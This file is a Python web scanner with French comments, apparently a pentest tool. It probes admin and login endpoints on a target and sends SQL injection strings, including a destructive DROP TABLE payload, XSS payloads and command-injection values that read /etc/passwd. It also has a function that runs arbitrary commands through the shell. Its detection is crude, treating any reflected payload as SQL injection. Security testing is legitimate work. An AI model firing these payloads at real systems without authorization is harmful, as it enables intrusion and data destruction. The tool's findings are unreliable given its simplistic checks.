# Exploit_Adv.py - Version Avanc√©e TROPIC üå¥
# Mode r√©el pour pentest web avanc√©, logs temps r√©el, rapports JSON

import subprocess
import time
import random
import json
import os
import requests
from urllib.parse import urljoin, urlencode
import string
import threading

# ===============================================================================
#                             CONFIGURATION GLOBALE
# ===============================================================================

DEFAULT_TIMEOUT = 7  # Timeout HTTP par d√©faut
MAX_THREADS = 5      # Threads simultan√©s pour scan endpoints
HEADERS = {
    "User-Agent": "TROPIC-Exploit-Scanner/3.0 (EthicalHacking)"
}
OUTPUT_DIR = "output"

# Types de vuln√©rabilit√©s possibles
VULN_TYPES = ["SQLi", "XSS", "RCE", "Command Injection", "InfoLeak"]

# ===============================================================================
#                       FONCTIONS UTILITAIRES
# ===============================================================================

def mkdir_safe(path):
    if not os.path.exists(path):
        os.makedirs(path)

def random_string(length=6):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def http_request_safe(url, method="GET", timeout=DEFAULT_TIMEOUT, headers=None):
    try:
        if headers is None:
            headers = HEADERS
        resp = requests.request(method, url, timeout=timeout, headers=headers)
        return resp.status_code, resp.text
    except requests.Timeout:
        return 504, "Timeout"
    except requests.ConnectionError:
        return 0, "ConnectionError"
    except Exception as e:
        return 500, str(e)

# ===============================================================================
#                     GENERATEUR DE LOGS / VULN SCAN
# ===============================================================================

def run_vulnerability_scan(target, config):
    """
    G√©n√©rateur de scan vuln√©rabilit√©s avanc√©es.
    Retourne des logs √©tape par √©tape.
    """
    mkdir_safe(OUTPUT_DIR)
    detected_vulns = []

    # ---------------------------------------------------------------------------
    # 1. D√©tection des endpoints expos√©s
    # ---------------------------------------------------------------------------
    endpoints = ["/login", "/api", "/admin", "/config", "/search"]
    yield "[STATE]1/5 - Scan des endpoints critiques"

    for ep in endpoints:
        url = urljoin(f"https://{target}", ep)
        status, _ = http_request_safe(url)
        if status == 200:
            detected_vulns.append({
                "severity": "MEDIUM",
                "target": url,
                "title": f"Endpoint expos√© d√©tect√© : {ep}",
                "remediation": "Restreindre l'acc√®s ou authentification obligatoire",
                "type": "Endpoint Exposure"
            })
            yield f"[VULN DETECTED] Endpoint expos√© {url}"
        else:
            yield f"[SAFE] Endpoint {url} non expos√© (Status: {status})"

        time.sleep(0.2)

    # ---------------------------------------------------------------------------
    # 2. Test d'injection SQL / XSS sur endpoints actifs
    # ---------------------------------------------------------------------------
    yield "[STATE]2/5 - Test d'injection SQL/XSS"
    payloads = {
        "SQLi": ["' OR '1'='1", "'; DROP TABLE users; --"],
        "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    }

    for vuln_type, plist in payloads.items():
        for ep in endpoints:
            url = urljoin(f"https://{target}", ep)
            for p in plist:
                test_url = f"{url}?q={urlencode({'input':p})}"
                status, resp_text = http_request_safe(test_url)
                # D√©tection basique : injection r√©ussie si payload refl√©t√©
                if p in resp_text:
                    detected_vulns.append({
                        "severity": "HIGH" if vuln_type=="SQLi" else "MEDIUM",
                        "target": test_url,
                        "title": f"{vuln_type} d√©tect√© sur {ep}",
                        "remediation": f"Sanitize input / Prepared statements pour {vuln_type}",
                        "type": vuln_type
                    })
                    yield f"[VULN DETECTED] {vuln_type} sur {test_url}"
                else:
                    yield f"[SAFE] {vuln_type} non d√©tect√© sur {test_url}"
                time.sleep(0.1)

    # ---------------------------------------------------------------------------
    # 3. Tests Command Injection simples
    # ---------------------------------------------------------------------------
    yield "[STATE]3/5 - Test Command Injection"
    cmd_payloads = ["; ls", "&& whoami", "| cat /etc/passwd"]
    for ep in endpoints:
        url = urljoin(f"https://{target}", ep)
        for cmd in cmd_payloads:
            test_url = f"{url}?cmd={urlencode({'input': cmd})}"
            status, resp_text = http_request_safe(test_url)
            if "root" in resp_text or "uid=" in resp_text:
                detected_vulns.append({
                    "severity": "CRITICAL",
                    "target": test_url,
                    "title": "Command Injection d√©tect√©e",
                    "remediation": "D√©sactiver l'ex√©cution de commandes depuis l'input utilisateur",
                    "type": "Command Injection"
                })
                yield f"[VULN DETECTED] Command Injection sur {test_url}"
            else:
                yield f"[SAFE] Command Injection non d√©tect√©e sur {test_url}"
            time.sleep(0.1)

    # ---------------------------------------------------------------------------
    # 4. Rapport final
    # ---------------------------------------------------------------------------
    mkdir_safe(OUTPUT_DIR)
    report_file = os.path.join(OUTPUT_DIR, f"{target}_vulnerability_report.json")
    with open(report_file, "w") as f:
        json.dump({"vulnerabilities": detected_vulns}, f, indent=4)

    yield f"[STATE]5/5 - Scan termin√©. {len(detected_vulns)} vuln√©rabilit√©s d√©tect√©es. Rapport: {report_file}"
    yield "[SCAN COMPLETE] Scan termin√© avec succ√®s."

# ===============================================================================
#                     EXECUTION REELLE PoC
# ===============================================================================

def simulate_poc_execution(target, command, force_real=True):
    """
    Ex√©cute la commande PoC (R√©el si force_real=True).
    Retourne stdout et code de sortie.
    """
    if not force_real:
        return f"[SIMULATION] Commande '{command}' simul√©e sur {target}", 200

    try:
        final_command = command.replace("{TARGET}", target)
        result = subprocess.run(final_command, shell=True, capture_output=True, text=True, timeout=30)

        stdout_text = ""
        if result.stdout:
            stdout_text += result.stdout
        if result.stderr:
            stdout_text += "\n[STDERR]\n" + result.stderr

        return stdout_text.strip(), result.returncode

    except subprocess.TimeoutExpired:
        return f"[ERROR] Timeout expir√© pour {command}", 504
    except FileNotFoundError:
        return f"[ERROR] Commande introuvable: {command}", 404
    except Exception as e:
        return f"[CRITICAL ERROR] {str(e)}", 500
